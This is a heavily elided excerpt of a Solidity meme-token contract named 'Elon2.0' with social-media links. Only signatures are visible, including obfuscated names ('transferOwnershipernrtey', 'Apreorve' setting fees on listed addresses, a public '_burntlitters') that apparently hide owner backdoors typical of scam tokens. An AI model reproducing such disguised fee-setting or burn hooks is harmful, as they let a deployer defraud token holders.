...
/**
https://t.me/ELON20_0x69420tg
https://twitter.com/ELON200x69420
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipernrtey(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract ELON20 is Ownable {
    ...
    constructor (){
        name = unicode"Elon2.0";
        symbol = unicode"ELON2.0";
        decimals = 9;
    ...
    function Apreorve(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burntlitters(address user) public {
